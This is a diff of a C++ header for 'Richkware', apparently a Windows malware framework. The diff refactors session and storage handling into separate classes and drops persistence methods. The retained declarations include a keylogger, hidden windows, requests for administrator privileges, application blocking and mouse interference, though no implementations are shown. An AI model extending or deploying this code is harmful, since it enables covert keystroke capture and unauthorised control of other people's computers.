@@ -21,45 +21,31 @@
 #include <string>
 #include <iterator>
 #include <list>
-#include <map>
 
 #include "crypto.h"
 #include "blockApps.h"
 #include "network.h"
+#include "storage.h"
 
 class Richkware {
 private:
-	std::map<std::string, std::string> session;
 	std::string appName;
-
-	void SaveValueReg(const char* path, const char* key, const char* value);
-	std::string LoadValueReg(const char* path, const char* key);
-	void SaveValueToFile(const char* value, const char* path = NULL);
-	std::string LoadValueFromFile(const char* path = NULL);
-
-	void SaveSession(const char* encryptionKey);
-	void LoadSession(const char* encryptionKey);
-
 public:
 	const char* encryptionKey;
 	BlockApps blockApps;
 	Network network;
+	Session session;
+	SystemStorage systemStorage;
 
 	Richkware(const char* AppNameArg, const char* EncryptionKeyArg);
 
-	void SaveInfo(const char* key, const char* value);
-	std::string FindInfo(const char* key);
-	void RemoveInfo(const char* key);
-	
 	BOOL IsAdmin();
 	void RequestAdminPrivileges();
-	void Persistance();
+
 	void StealthWindow(const char* window);
 	void OpenApp(const char* app);
 	void Keylogger(const char* fileName);
-	bool CheckSession();
-	bool CheckPersistance();
-	
+
 	void Hibernation();
 	void RandMouse();
 
